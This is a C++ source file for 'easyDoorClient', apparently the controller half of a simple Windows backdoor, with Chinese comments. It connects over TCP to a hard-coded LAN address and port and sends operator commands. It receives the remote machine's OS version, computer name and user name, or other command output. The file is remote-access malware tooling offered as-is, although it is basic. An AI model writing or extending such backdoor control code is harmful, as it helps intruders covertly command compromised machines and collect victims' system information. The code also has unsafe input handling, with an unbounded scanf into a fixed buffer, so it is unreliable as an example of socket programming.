// easyDoorClient.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <winsock2.h>
#include <stdio.h>
#include <conio.h>

#pragma comment (lib, "ws2_32")

#define NAME_LEN 20

typedef struct _SYS_INFO
{
    OSVERSIONINFO OsVer;            // 保存操作系统信息
    char szComputerName[NAME_LEN];   // 保存计算机名
    char szUserName[NAME_LEN];       // 保存当前登录名
}SYS_INFO, *PSYS_INFO;

VOID ShowSysInfo(PSYS_INFO SysInfo)
{
    if ( SysInfo->OsVer.dwPlatformId == VER_PLATFORM_WIN32_NT )
    {
        if ( SysInfo->OsVer.dwMajorVersion == 5 && SysInfo->OsVer.dwMinorVersion == 1 )
        {
            printf("Windows XP %s \r\n", SysInfo->OsVer.szCSDVersion);
        }
        else if ( SysInfo->OsVer.dwMajorVersion == 5 && SysInfo->OsVer.dwMinorVersion == 0)
        {
            printf("Windows 2K \r\n");
        }
    }
    else
    {
        printf("Ohter System \r\n");
    }
    
    printf("Computer Name is %s \r\n", SysInfo->szComputerName);
    
    printf("User Name is %s \r\n", SysInfo->szUserName);
}

int main(int argc, char* argv[])
{
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET ClientSock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

    sockaddr_in ServerAddr;
    ServerAddr.sin_family = PF_INET;
    ServerAddr.sin_addr.S_un.S_addr = inet_addr("192.168.189.128");
    ServerAddr.sin_port = htons(827);

    connect(ClientSock, (SOCKADDR*)&ServerAddr, sizeof(SOCKADDR));

    while ( TRUE )
    {
        char Buff[MAXBYTE] = { 0 };
        char Cmd[MAXBYTE] = { 0 };

        recv(ClientSock, Buff, MAXBYTE, 0);
        printf("%s", Buff);

        scanf("%s", Cmd);
        send(ClientSock, Cmd, MAXBYTE, 0);
        if ( !strcmp(Cmd, "exit") )
        {
            printf("Login out ! \r\n");
            break;
        }
        
        memset(Buff, 0, MAXBYTE);
        recv(ClientSock, Buff, MAXBYTE, 0);

        if ( !strcmp(Cmd, "getsysinfo"))
        {
            PSYS_INFO SysInfo = (PSYS_INFO)Buff;
            
            ShowSysInfo(SysInfo);
        }
        else
        {
            printf("%s \r\n", Buff);
        }
    }

    getch();

    WSACleanup();

	return 0;
}